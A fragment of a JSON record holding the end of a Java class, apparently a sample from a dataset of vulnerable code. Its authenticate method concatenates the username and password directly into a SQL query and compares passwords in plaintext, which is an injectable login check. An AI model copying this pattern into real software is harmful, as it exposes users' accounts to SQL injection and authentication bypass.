                    "text": "    }\n\n    public boolean authenticate(String username, String password) {\n\n        return jdbcTemplate.query(\n                \"SELECT 1 FROM users WHERE username = '\" + username + \"' AND password = '\" + password + \"'\",\n                ResultSet::next);\n    }\n\n}\n"
                  }
